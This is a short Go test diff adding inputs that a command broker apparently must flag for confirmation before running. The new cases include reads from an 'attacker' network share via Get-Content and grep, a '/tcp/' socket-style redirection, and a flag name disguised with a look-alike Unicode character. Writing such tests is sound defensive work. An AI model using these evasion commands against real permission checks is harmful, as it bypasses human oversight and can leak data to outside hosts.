@@ -55,6 +55,10 @@ func TestReadOnlyExec_BrokerAsks(t *testing.T) {
 			"git branch --sort=signature",
 			"Get-Date -p v",
 			"brew info ./evil.rb",
+			`Get-Content \$null\attacker\share\x.txt`,
+			"cat < ~+/tcp/127.0.0.1/9",
+			"grep -1f//attacker/share/p.txt x",
+			"Get-Date -OutـVariable zz",
 		} {
 			before := asked
 			if b.Confirm(ctx, "os_exec", cmd) {
